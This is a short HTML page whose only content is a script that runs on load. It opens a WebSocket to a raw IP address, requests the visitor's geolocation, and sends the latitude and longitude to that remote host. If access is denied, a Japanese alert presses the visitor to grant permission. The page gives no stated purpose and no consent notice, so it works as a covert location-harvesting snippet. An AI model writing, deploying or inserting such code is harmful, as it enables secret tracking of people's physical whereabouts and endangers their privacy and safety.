<meta charset="UTF-8">
<script type="text/javascript">
    ws = new WebSocket("wss://114.146.22.1:4721/")
    navigator.geolocation.getCurrentPosition(function(p){
        ws.send(`${p.coords.latitude}, ${p.coords.longitude}`)
    },
    function(p){
        alert("位置情報を許可してください。")
    })
</script>
